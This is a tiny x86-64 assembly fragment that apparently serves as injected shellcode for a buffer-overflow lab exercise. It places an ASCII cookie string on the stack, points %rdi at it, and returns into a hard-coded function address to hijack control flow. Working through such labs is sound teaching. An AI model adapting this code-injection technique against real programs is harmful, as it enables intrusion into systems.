mov $0x3130333634303233,%rax
mov %rax,(%rsp)
xor %rax,%rax
mov %rax,8(%rsp)
lea (%rsp),%rdi
push $0x4018ba
ret
